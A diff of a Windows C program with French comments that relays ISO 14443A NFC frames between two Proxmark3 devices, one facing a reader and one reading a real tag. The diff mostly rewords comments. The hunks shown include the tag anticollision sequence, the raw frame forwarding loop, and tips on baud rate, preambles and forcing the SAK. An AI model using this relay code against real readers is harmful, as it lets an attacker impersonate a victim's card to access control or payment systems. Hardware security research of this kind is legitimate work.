@@ -1,12 +1,11 @@
-cat << 'EOF' > full_relay.c
 #include <windows.h>
 #include <stdio.h>
 #include <stdint.h>
 
 //Valider le code 
 /*Ouvre un terminal et lance : proxmark3.exe COM9 --flush.
-Ensuite, tape une commande hf 14a raw. Regarde dans le dossier client/logs/ (si activé) 
-ou utilise un Serial Port Monitor gratuit. Tu verras les octets exacts envoyés. Si tu vois 43 48 au début de chaque paquet, 
+Ensuite, taper une commande hf 14a raw. Regarder dans le dossier client/logs/ (si activé) 
+ou utilise un Serial Port Monitor gratuit. on verras les octets exacts envoyés. Si on vois 43 48 au début de chaque paquet, 
 le code est sur la bonne voie.*/
 
 /*Si jamais le code reste muet : 
@@ -14,22 +13,22 @@ le code est sur la bonne voie.*/
 send_pm3_raw(hMole, 0x0103, NULL, 0);
 Si les LEDs ne bougent pas, c'est que soit le Baudrate est faux, soit le Preamble est mal interprété par le firmware.
 
-Le sniff_ports est ton meilleur ami. Si après 5 secondes il est vide :
-Vitesse (Baudrate) : Change CBR_115200 par CBR_460800 dans open_serial. Les firmwares Iceman/RRG modernes utilisent souvent 460800.
-Le Préambule : Tu as mis 0x4843 dans send_pm3_raw (Correct pour envoyer 'CH' vers le PM3) et tu vérifies 0x4348 dans start_relay 
-(Correct pour recevoir 'HC' du PM3). Cependant, vérifie dans ton sniffer si tu ne vois pas 50 4d 33 (PM3). 
+sniff_ports --> Si après 5 secondes il est vide :
+Vitesse (Baudrate) : Changer CBR_115200 par CBR_460800 dans open_serial. Les firmwares Iceman/RRG modernes utilisent souvent 460800.
+Le Préambule : On a 0x4843 dans send_pm3_raw (Correct pour envoyer 'CH' vers le PM3) et on vérifie 0x4348 dans start_relay 
+(Correct pour recevoir 'HC' du PM3). Cependant, il faut aussi vérifier dans le sniffer si on ne vois pas 50 4d 33 (PM3). 
 Certains firmwares utilisent un préambule différent.
 
 Problème de bufferisation Windows
 Windows a tendance à garder les octets en mémoire pour optimiser les transferts. 
-Si rien ne s'affiche, force la lecture en ajoutant ceci dans open_serial :
+Si rien ne s'affiche, forcer la lecture en ajoutant ceci dans open_serial :
 PurgeComm(hSerial, PURGE_RXCLEAR | PURGE_TXCLEAR | PURGE_RXABORT | PURGE_TXABORT);
 
-Les IDs que tu as définis sont "probables" mais pas universels.
-Si get_uid_from_mole échoue : C'est que PM3_CMD_HF_ISO14443A_READER_RAW (0x0385) n'est pas le bon ID pour ton firmware.
-Solution : Ouvre ton client Proxmark officiel, tape hf 14a raw 26, et regarde dans le log quel ID de commande est envoyé au matériel.
+Les IDs qu'on a a définis sont "probables" mais pas universels.
+Si get_uid_from_mole échoue : C'est que PM3_CMD_HF_ISO14443A_READER_RAW (0x0385) n'est pas le bon ID pour le firmware.
+Solution : Ouvrir le client Proxmark officiel, taper hf 14a raw 26, et regarder dans le log quel ID de commande est envoyé au matériel.
 
-Voici où la donnée peut se perdre :
+Où la donnée peut se perdre :
 PC -> Proxy : Le port COM est-il ouvert par un autre processus (ex: un client PM3 oublié) ?
 Proxy -> PC : Le firmware n'envoie rien si l'antenne n'est pas active ou si aucune trame n'est reçue du lecteur.
 Mole -> Tag : Si get_uid_from_mole ne renvoie rien, vérifie que le tag est bien positionné.
@@ -139,13 +138,13 @@ int get_uid_from_mole(HANDLE hMole, uint8_t* out_uid) {
 
     printf("[*] Demarrage de la sequence d'anticollision sur le MOLE...\n");
 
-    // 1. REQA (0x26) pour reveiller le tag
+    //REQA (0x26) pour reveiller le tag
     uint8_t reqa = 0x26;
     send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, &reqa, 1);
     Sleep(50);
     if (!(ReadFile(hMole, buffer, sizeof(buffer), &bytes, NULL) && bytes >= 6)) return 0;
 
-    // 2. ANTICOLLISION Cascade Level 1 (0x93 0x20)
+    //ANTICOLLISION Cascade Level 1 (0x93 0x20)
     uint8_t cl1[] = {0x93, 0x20};
     send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, cl1, 2);
     Sleep(50);
@@ -160,14 +159,14 @@ int get_uid_from_mole(HANDLE hMole, uint8_t* out_uid) {
     }
     memcpy(out_uid, &pkt->data[1], 3);
 
-    // 3. SELECT Cascade Level 1 (0x93 0x70 + 5 octets reçus)
+    //SELECT Cascade Level 1 (0x93 0x70 + 5 octets reçus)
     uint8_t sel1[7] = {0x93, 0x70};
     memcpy(&sel1[2], pkt->data, 5);
     send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, sel1, 7);
     Sleep(50);
     ReadFile(hMole, buffer, sizeof(buffer), &bytes, NULL); // On purge le SAK
 
-    // 4. ANTICOLLISION Cascade Level 2 (0x95 0x20)
+    //ANTICOLLISION Cascade Level 2 (0x95 0x20)
     uint8_t cl2[] = {0x95, 0x20};
     send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, cl2, 2);
     Sleep(50);
@@ -183,7 +182,7 @@ int get_uid_from_mole(HANDLE hMole, uint8_t* out_uid) {
     Pour un Ultralight, le SAK final doit être 0x00.
     Si le relai affiche un SAK de 0x04, le lecteur va croire que c'est un tag qui supporte l'ISO-DEP 
     (comme une carte bancaire) et le code libnfc va essayer d'envoyer des commandes RATS au lieu de READ.
-    Vérifiee la sortie du sniffer : si on vois passer 0x04 après le SELECT CL2, 
+    Vérifier la sortie du sniffer : si on vois passer 0x04 après le SELECT CL2, 
     il faudra peut-être forcer le SAK à 0x00 dans l'initialisation de simulation*/
 }
 
@@ -233,12 +232,12 @@ void send_pm3_raw(HANDLE h, uint16_t cmd, uint8_t* data, uint16_t len) {
 }
 
 
-// --- MODE HARDCORE DEBUG : RELAI BRUT ---
+// --- MODE DEBUG : RELAI BRUT ---
 void hardcore_debug_relay(HANDLE hProxy, HANDLE hMole) {
     uint8_t buf[2048];
     DWORD bytes;
 
-    printf("\n[!!!] MODE DEBUG HARDCORE ACTIF [!!!]\n");
+    printf("\n[!!!] MODE DEBUG ACTIF [!!!]\n");
     printf("[*] Tout ce qui passe par COM9 sera envoye sur COM10 et vice versa.\n");
     printf("[*] Appuyez sur Ctrl+C pour arreter.\n\n");
 
@@ -270,7 +269,7 @@ void start_relay(HANDLE hProxy, HANDLE hMole) {
     printf("[*] Relai actif. En attente du lecteur...\n");
 
     while (1) {
-        // 1. Lire depuis le PROXY (Lecteur -> PC)
+        //Lire depuis le PROXY (Lecteur -> PC)
         if (ReadFile(hProxy, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 6) {
             PM3PacketNG* pkt = (PM3PacketNG*)buffer;
             
@@ -279,7 +278,7 @@ void start_relay(HANDLE hProxy, HANDLE hMole) {
                 //if (memcmp(buffer, "CH", 2) == 0 || memcmp(buffer, "HC", 2) == 0)
                 printf("[LECTEUR] Commande: %02X (len %d)\n", pkt->data[0], pkt->len_ng & 0x7FFF);
                 
-                // 2. Relayer vers le MOLE (PC -> Tag)
+                //Relayer vers le MOLE (PC -> Tag)
                 // On utilise la commande 'hf 14a raw' sur le Mole
                 send_pm3_raw(hMole, PM3_CMD_HF_ISO14443A_READER_RAW, pkt->data, pkt->len_ng & 0x7FFF);
 
@@ -331,7 +330,7 @@ int main() {
 
     printf("[+] Ports ouverts avec succès : PROXY (%s) et MOLE (%s)\n", PROXY_PORT, MOLE_PORT);
 
-    // 1. Sniffer pour vérifier les IDs de commande
+    // Sniffer pour vérifier les IDs de commande
     sniff_ports(hProxy, hMole);
     printf("[*] Sniffer terminé. Vérifiez les IDs de commande et ajustez le code si nécessaire.\n");
     send_pm3_raw(hMole, 0x0103, NULL, 0);
@@ -357,7 +356,7 @@ int main() {
     uint8_t init_reader[] = {0x01}; // Active l'antenne
     send_pm3_raw(hMole, 0x0380, init_reader, 1); 
 
-    // 1. Récupération de l'UID réel sur le Mole
+    //Récupération de l'UID réel sur le Mole
     uint8_t real_uid[7] = {0};
     if (get_uid_from_mole(hMole, real_uid)) {
         printf("[+] UID détecté : %02X%02X%02X%02X%02X%02X%02X\n", 
@@ -388,4 +387,3 @@ int main() {
     CloseHandle(hMole);
     return 0;
 }
-EOF
